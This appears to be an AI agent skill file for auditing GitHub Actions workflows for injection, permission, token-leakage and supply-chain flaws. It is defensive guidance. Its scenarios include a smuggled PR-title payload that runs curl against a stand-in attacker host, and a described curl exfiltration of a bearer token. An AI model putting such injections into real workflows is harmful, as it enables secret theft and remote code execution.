---
name: gha-security-review
description: "Audits GitHub Actions workflow files (.github/workflows/*.yml|.yaml) for action-permission misuse, injection vulnerabilities, token leakage, supply-chain risks, and unsafe expression handling. Use when adding or modifying a workflow, reviewing a PR that touches CI files, designing CI step order, hardening an existing workflow, or before any deploy pipeline change. Each finding ships with a concrete exploit scenario, not just a vuln label."
allowed-tools: "Read Grep Glob Bash WebFetch"
---

# gha-security-review

## Overview

GitHub Actions workflows (`.github/workflows/`) are executable code with the same blast radius as production. A `pull_request_target` trigger with `${{ github.event.pull_request.title }}` interpolation is a remote code execution waiting to happen. This skill audits workflows as code, **not** as config — every finding answers "what exact input would the attacker control and what execution primitive do they reach".

This is the **CI/CD-layer** counterpart to:

| Layer | Skill | Focus |
|---|---|---|
| Application code | [`security-and-hardening`](~/.agents/skills/security-and-hardening/SKILL.md) | input validation, auth, OWASP, secrets-in-source |
| Supply chain + deploy | [`security-devsecops`](~/.agents/skills/security-devsecops/SKILL.md) | deps, SBOM, secrets rotation, IaC, container, pre-deploy |
| **CI/CD workflows** | **`gha-security-review`** (this skill) | `.github/workflows/` action misuse, injection, token leakage |
| Production monitor + incident | [`observability-and-instrumentation`](~/.agents/skills/observability-and-instrumentation/SKILL.md) + [`security-incident-response`](~/.agents/skills/security-incident-response/SKILL.md) | runtime visibility + post-incident response |

**OMO integration**: this skill pairs with `oracle` agent for "is this `permissions:` block actually minimal?" judgment calls, and `grep_app` MCP for hunting known-bad action patterns across GitHub.

## When to Use

**Use when:**

- Adding a new workflow file under `.github/workflows/`
- Modifying an existing workflow (changed trigger, added step, changed `permissions:`, switched action version)
- Reviewing a PR that touches any `.github/workflows/*.yml|.yaml`
- Hardening an existing workflow before public release or before connecting to production secrets
- Designing CI step order (which job runs first, what secrets each job gets)
- Auditing third-party action usage (`uses: <owner>/<repo>@<ref>`)

**NOT for:** (scenario description — let description match decide)

- Application-layer source code review → [`security-and-hardening`](~/.agents/skills/security-and-hardening/SKILL.md)
- Deploy-time gate (after merge, before rollout) → [`pre-ship-gate`](~/.agents/skills/pre-ship-gate/SKILL.md) (after this skill ships)
- Dependency / SBOM / IaC / container / pre-deploy → [`security-devsecops`](~/.agents/skills/security-devsecops/SKILL.md)
- General PR review without CI-specific scope → [`verification-before-completion`](~/.agents/skills/verification-before-completion/SKILL.md)

## Process

### 1. Inventory

Map every workflow file + reusable workflow + composite action that ships in this repo (or in scope):

```bash
# 1a. List top-level workflows
ls -la .github/workflows/

# 1b. Find reusable + composite actions
find . -path ./.git -prune -o \( -name 'action.yml' -o -name 'action.yaml' \) -print
```

For each file, capture:

- `on:` triggers (especially `pull_request_target`, `workflow_run`, `issue_comment` with command triggers)
- `permissions:` (top-level or per-job) — `permissions: write-all` or missing is red flag
- `secrets:` usage — list env names that pass through `secrets.*`
- `uses:` lines for each step — third-party actions or unpinned `@<sha>` vs `@v1`/`@main`

### 2. Classify each finding

For each issue, classify along two axes:

| Axis | Values |
|---|---|
| **Trigger surface** | `pull_request_target` (HIGH — runs with target repo secrets regardless of fork) / `pull_request` (fork safe) / `push` (maintainer-controlled) / `workflow_run` (cross-workflow attack surface) / `schedule` / manual |
| **Exploit primitive** | arbitrary code exec / secrets exfiltration / write to protected branch / cache poisoning / artifact poisoning / runner pwn |

Every finding MUST cite: file:line + a concrete attacker-controlled input + what primitive they reach. No abstract labels.

### 3. The 7 categories

Audit the workflow for ALL of the following categories. A workflow may have findings in zero or more.

#### 3.1 Trigger: `pull_request_target` + checkout of PR head

**The classic**. `on: pull_request_target` runs with the **target repo's** secrets (write-capable token, deployment creds, etc.). If any step in that job runs `actions/checkout@<ref> with ref: ${{ github.event.pull_request.head.sha }}` and then runs scripts from that PR (or `npm install` in it), attacker has full repo secrets from a fork PR.

**Exploit scenario template**: "An attacker forks the repo, adds a postinstall script in `package.json`, opens a PR. The `pull_request_target` job checks out their head, runs `npm install`. The postinstall fires with write-token in env."

**Mitigation**: `pull_request_target` only for triage jobs (label, comment). Use `pull_request` for any checkout-and-execute step. Or use `pull_request_target` with no `checkout` and never read `${{ github.event.pull_request.* }}` user content.

#### 3.2 Expression injection in `${{ }}`

Any `${{ github.event.* }}` or `${{ github.head_ref }}` or `${{ env.* }}` flowing into a `run:` block (not `with: <input>`) is injectable.

**Exploit scenario template**: "PR title = `$(curl -X POST https://attacker/x)`; a step runs `echo ${{ github.event.pull_request.title }} >> $GITHUB_OUTPUT` (or shell). Shell runs the curl."

**Mitigation**: never interpolate `github.event.*` into a shell `run:` block. Pass via `env:` to scripts that read it as a variable (no shell parsing). Use double-quote variables: `"$VAR"` not bare.

#### 3.3 Unpinned third-party actions

`uses: third-party/action@v1` or `@main` is supply-chain risk: the action publisher can swap the implementation retroactively (tag re-assignment, branch force-push).

**Exploit scenario template**: "Maintainer of `popular/action` gets phished, attacker pushes commit, updates v1 tag to point at malicious code. Every CI run since then pulls the malicious version."

**Mitigation**: pin to full commit SHA (`uses: third-party/action@<40-hex-sha>`). Add a comment with the human-readable version for grep:

```yaml
uses: third-party/action@a1b2c3d4e5f6...  # v2.3.4
```

For first-party (`uses: actions/checkout@...`), pin to SHA too — same blast radius even though maintained by GitHub.

#### 3.4 Excessive `permissions:`

GHA workflows default to `permissions: write-all` for legacy GITHUB_TOKEN unless explicitly narrowed. A `pull_request` job that only lints files does NOT need `contents: write`, `pages: write`, `id-token: write`, etc.

**Exploit scenario template**: "An attacker PR drops a poison step (via another finding, e.g. expression injection) and the runner has `contents: write`. They push commits to the protected branch, bypassing code review."

**Mitigation**: top-level `permissions:` set to minimum. Per-job override only if needed.

```yaml
# Top of file:
permissions: read-all

# Job that needs write:
jobs:
  deploy:
    permissions:
      contents: write
      id-token: write
```

#### 3.5 Secret leakage via `run:` block

`env: ${{ secrets.X }}` in a `run:` block where the same env var name appears in a log line, error message, or third-party action argument can be captured in build logs (visible to anyone with `actions: read` on PRs).

**Exploit scenario template**: "Workflow sets `FOO_TOKEN: ${{ secrets.FOO }}` as env. A subsequent `curl -H \"Authorization: Bearer $FOO_TOKEN\" $URL` line with `$URL` set to attacker-controlled host (e.g. via `pull_request_target` + interpolated title) exfiltrates the token in the URL."

**Mitigation**: mask each secret value (GitHub does it automatically when matched by name pattern, but be explicit). Never echo secrets in curl/build logs; use pre-masked values: `${{ secrets.MASKED_NAME }}` (mask by secret name pattern). Never pass secrets via URL parameters.

#### 3.6 Cross-workflow attack via `workflow_run`

`on: workflow_run` lets one workflow run when another finishes. If the inner workflow was triggered by a fork PR (e.g. via `pull_request` in a permissive repo), the outer workflow runs in the trusted context with elevated creds.

**Exploit scenario template**: "Repo A's `pull_request` workflow writes a file to GCS via OIDC. Repo A has a `workflow_run` listener that deploys to prod when the PR workflow succeeds. An attacker forks, opens PR with malicious job; the workflow_run fires against trusted creds."

**Mitigation**: gate `workflow_run` on `github.event.workflow_run.conclusion == 'success'` AND branch check. Never pipe `pull_request` artifacts directly into deploy.

#### 3.7 Artifact poisoning

`actions/upload-artifact` / `actions/download-artifact` paths flow into `${{ github.* }}` resolved to a PR's own artifact name → can collide across PRs in the same workflow run, deliver wrong artifact to reviewer.

**Exploit scenario template**: "Two PRs run in parallel. PR #100 uploads artifact `dist.tar.gz`. PR #101's downstream job downloads `dist.tar.gz` but the cache key collision means PR #101 deploys PR #100's malicious build."

**Mitigation**: include `github.run_id` + `github.run_attempt` in artifact name. Don't download artifact in same workflow that uploaded from a fork.

### 4. Output format

For each finding, emit:

```markdown
### [SEVERITY] <one-line summary>
- **File**: `path:line`
- **Trigger surface**: pull_request_target | pull_request | push | workflow_run | schedule | manual
- **Attacker input**: <exact data the attacker controls>
- **Exploit primitive**: <code exec / secrets leak / branch write / etc.>
- **Concrete scenario**: <2-3 sentence attacker narrative>
- **Mitigation**: <specific YAML change>

Severity: CRITICAL (secrets leak / RCE) > HIGH (branch write / cache poison) > MEDIUM (info leak) > LOW (best practice deviation)
```

End with a **scope audit summary**:

| Trigger | Workflows | Has `permissions:`? | SHA-pinned actions | Findings |
|---|---|---|---|---|
| pull_request_target | ci.yml | yes, read-all | yes | 0 |
| push | release.yml | yes, write-needed | yes | 1 (SECRET-LOG) |

### 5. hush — what NOT to report

- Versions of FIRST-party GitHub actions (`actions/checkout@v4`) — pin to SHA but flag low-severity
- Use of `GITHUB_TOKEN` at all (it's standard)
- Workflows in vendor / doc / example directories OUT OF SCOPE
- `act`-local script injection issues (act is dev-only; report only if action calls external network)

## Common Rationalizations

| Excuse | Why it's wrong |
|---|---|
| "It's a personal repo, no one forks it" | Exploit requires only one untrusted fork. Public visibility ≠ unique PRs. |
| "Third-party action is popular, it's fine" | Popular ≠ trustworthy. Same tag-reassignment attack works regardless of stars. |
| "We have CODEOWNERS, contributors are vetted" | Vetting happens at PR time; the malicious payload fires at CI time, not at code-review time. |
| "We use Dependabot for action updates" | Dependabot updates versions, not the supply-chain risk profile. Pin-to-SHA is orthogonal. |
| "Just lint, no real harm" | Lint jobs run on `pull_request` of forks by default; token scope is platform-level, not job-level, until explicitly narrowed. |
| "It's a workflow call, not a command" | `uses:` is just as dangerous as `run:` — payload in any of the `with:` inputs flows into the action's container. |
| "I'll fix it later in a hardening PR" | Each day of unhardened workflow = day of exploitable RCE/secrets for fork PRs. Hardening PR can be the next commit. |

## Red Flags

A workflow audit is going wrong if:

- Findings are listed as "Possible XSS" or "TODO: review auth" without file:line + attacker input
- Severity levels are missing
- Mitigation is generic ("use least privilege") not specific ("change permissions: to read-all at top")
- You're reading GITHUB docs to verify syntax instead of attack research (StepSecurity HackerBot, `actions/` advisories, GTFOBins-style pattern catalogs)
- You've audited one workflow but skipped the other 5 in `.github/workflows/`
- You weren't actually shown the workflow file (you're pattern-matching from a description)

## Verification

Before claiming audit complete, produce evidence:

- [ ] `find . -path ./.git -prune -o -name 'action.yml' -o -name 'action.yaml' -print` enumerated
- [ ] Each workflow file read in full (not skimmed)
- [ ] Each finding cites file:line
- [ ] Each finding has attacker input + exploit primitive + concrete scenario
- [ ] No "we should consider" or "in theory this could be" — only confirmed findings with reproducible scenario
- [ ] Severity present on every finding
- [ ] Mitigation is concrete YAML snippet, not paragraph
- [ ] Output is grouped by category (3.1-3.7)
- [ ] Scope audit summary table complete (no row marked "skipped" without reason)

**Acceptance criterion**: A second reviewer reading only your findings should be able to reproduce the exploit scenario on a fork without further questions.
